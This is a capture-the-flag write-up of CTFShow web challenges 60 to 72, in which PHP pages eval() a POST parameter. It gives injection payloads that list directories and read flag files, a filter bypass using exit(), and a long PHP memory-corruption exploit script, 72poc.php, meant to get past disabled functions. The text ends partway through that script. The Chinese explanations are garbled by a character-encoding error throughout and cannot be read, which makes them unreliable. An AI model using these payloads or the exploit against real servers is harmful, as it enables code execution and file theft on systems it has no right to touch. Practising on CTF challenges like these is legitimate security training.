<h2 id="web60â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web60â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web60â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web60â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p><strong>åŒ web58</strong></p>
<h2 id="web61â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web61â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web61â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web61â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p><strong>åŒ web58</strong></p>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>å¯ä»¥ä½¿ç”¨ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(<span class="string">&#x27;./&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p> æ‰«æå½“å‰ç›®å½•ä¸‹çš„å†…å®¹:</p>
</li>
</ol>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web61.png"></p>
<ol start="2">
<li><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ web 40 ä¸­ä¸€æ ·çš„æ–¹æ³•:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">c=show_source(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="web62â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web62â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web62â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web62â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>åŒä¸Š</p>
<h2 id="web63â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web63â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web63â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web63â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>åŒä¸Š</p>
<h2 id="web64â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web64â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web64â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web64â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>åŒä¸Š</p>
<h2 id="web65â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web65â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web65â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web65â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>åŒä¸Š</p>
<h2 id="web66â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web66â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web66â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web66â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web66.png"></p>
<p><strong>ç§€ç§€å¾—äº†,è¿™æ¬¡ä¸åœ¨è¿™é‡Œ!</strong>â€˜â€™</p>
<p>æ‰«æå½“å‰ç›®å½•:  æ²¡æœ‰æ­£ç¡®çš„flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&#x27;./&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>æ‰«ææ ¹ç›®å½•: å‘ç° flag.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web66_1.png"></p>
<p>æŸ¥çœ‹ æ ¹ç›®å½•ä¸‹çš„ flag.txt:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=highlight_file(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web66_2.png"></p>
<h2 id="web67â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web67â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web67â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web67â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒ web66</strong></p>
<h2 id="web68â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web68â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web68â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web68â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :: æ²¡æœ‰æ˜¾ç¤ºæºç å¯èƒ½ç¯å¢ƒåäº†ï¼Œåªæœ‰ä¸€ä¸ªæŠ¥é”™:æ˜¾ç¤º highlight_file() ä¸èƒ½ä½¿ç”¨</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web68.png"></p>
<p>çœ‹äº†å®˜æ–¹æç¤º:ç”¨ include</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">// ä¼šæ˜¾ç¤º è¶…è¿‡äº†å†…å­˜å¤§å°ï¼Œè¯æ˜ index.php æ–‡ä»¶å¤ªå¤§äº†</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web68_1.png"></p>
<p>æ ¹æ®ä¸Šé¢å‡ é“é¢˜çš„ flag çš„ä½ç½®ï¼Œå°è¯• ç›´æ¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web68_2.png"></p>
<h2 id="web69â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web69â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web69â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web69â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒ web68</strong></p>
<h2 id="web70â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web70â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web70â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web70â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒ web68</strong></p>
<h2 id="web71â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web71â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web71â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web71â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ob_get_contentx() 	è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹</span></span><br><span class="line"><span class="comment">// ob_start() 			æ‰“å¼€è¾“å‡ºæ§åˆ¶ç¼“å†²</span></span><br><span class="line"><span class="comment">// ob_end_clean() 		æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²</span></span><br><span class="line"><span class="comment">// æŠŠ æ•°å­—å­—æ¯ éƒ½æ›¿æ¢ä¸ºäº† &#x27;?&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜é¦–å…ˆ æ‰§è¡Œ : eval($c),å°†è·å–åˆ°äº†$cæ‰§è¡Œä¸€éï¼Œç„¶å $s = bo_get_contents();å°†$cæ‰§è¡Œçš„å†…å®¹ç”±ç¼“å­˜è¯»å–åˆ°äº†å˜é‡ $s,æ¥ä¸‹æ¥çš„ preg_replace()ä¼šå°†ç¼“å­˜ä¸­çš„æ‰€æœ‰å†…å®¹æ›¿æ¢ä¸ºâ€˜?â€™:å› æ­¤æˆ‘ä»¬å°†ä¼šçœ‹åˆ°å¦‚ä¸‹ï¼š</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web71.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼šæ‰«æç›®å½•å‡ºæ¥çš„ç»“æœéƒ½å˜äº† <strong>??????? and ä½ è¦ä¸Šå¤©å—ï¼Ÿ</strong>,å› æ­¤ä¸å¾—è®© ? æ‰§è¡Œï¼Œé‚£ä¹ˆå¯åœ¨ eval($c)æ‰§è¡Œå®Œæ¯•åå°†æ•´ä¸ªphpç¨‹åºç»™ç»“æŸä¸å†æ‰§è¡Œåé¢çš„è¯­å¥å°±ç»•è¿‡å­—æ¯æ•°å­—çš„æ›¿æ¢:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">die</span>();</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web71_1.png"></p>
<p>å¦‚å›¾æ‰¾åˆ°äº† flag.txt å’Œä¸Šé¢å‡ é“é¢˜çš„ä½ç½®ä¸€æ ·:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web71_2.png"></p>
<h2 id="web72â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web72â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web72â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web72â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç åŒä¸Šä¸€é¢˜: æ­¤é¢˜ä¸ä¼šï¼Œçœ‹äº†ç½‘ä¸Šå¤§ä½¬:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="comment">// DirectoryIterator ç±»æä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£</span></span><br><span class="line"><span class="comment">// ç®€å•çš„è¯´ DirectoryIterator å¯ä»¥è¯»å–ç›®å½•</span></span><br><span class="line"><span class="comment">// glob:// æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼, æ­¤å¤„ /* è¡¨ç¤ºæ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶æ‰€ä»¥åœ¨é¢˜ç›®ç¯å¢ƒä¸‹æ‰§è¡Œå°†ä¼šæ˜¾ç¤ºå‡º æ ¹ç›®å½•ä¸‹å­˜åœ¨ flag0.txt æ–‡ä»¶; å½“ç„¶ä¹Ÿå¯ä»¥æ˜¾ç¤ºå…¶ä»–ç›®å½•ä¸­çš„æ–‡ä»¶: /var/* è¡¨ç¤º /varç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web72_1.png"></p>
<p>çœ‹äº†VIPç¾¤é‡Œçš„è„šæœ¬ï¼š 72poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span 